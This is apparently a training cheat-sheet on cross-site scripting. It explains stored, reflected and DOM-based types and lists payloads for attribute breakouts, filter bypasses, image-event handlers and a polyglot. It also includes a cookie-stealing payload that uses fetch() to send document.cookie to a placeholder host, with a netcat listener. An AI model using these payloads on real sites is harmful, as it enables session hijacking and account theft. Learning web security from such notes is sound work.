Types:
- **Stored**: malicious payload is stored in database, then reflected to the user.
	- Example: malicious link to hijack session cookie in a blog post.
- **Reflected**: the payload is in the request (url parameters, headers…). The server reflects the payload immediately in the response. No payload is stored.
	- Example: malicious link via phishing.
- **DOM Based**: happens directly in the browser without any new pages being loaded or data submitted to backend code. Occurs when the website JavaScript code acts on input or user interaction.
	- Example: the website’s JS takes `window.document.hash` and writes it onto the page in the currently viewed section without checks or sanitizations.

# Examples:
Common XSS on `<input>`:
```text
<script>alert('XSS');</script>
```

If the input is rendered as `<h2>Hello, <input value="XSS"></h2>`:
```text
"><script>alert('XSS)';</script>
```

If the input is rendered into the document with JS code like `document.getElementsByClassName('name')[0].innerHTML = 'XSS';`:
```text
';alert('XSS');//
```
> The // is used to comment the rest of the line.

If the JS code removes words such as “script”:
```sh
<sCript>alert('XSS');</sCript>
<sscriptcript>alert('XSS');</sscriptcript>
```

If the input is used to introduce an image path such as `/images/cat.jpg`:
```text
/images/cat.jpg" onload="alert('XSS');
/images/x.jpg" onerror="alert('XSS');
```

---

To steal cookies with a stored XSS, attacker listens in an arbitrary port:
```sh
nc -nlvp 4444
```

Then, the payload introduced in the website (assume vulnerable textarea):
```text
`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
```


---
# Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one:
```sh
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
```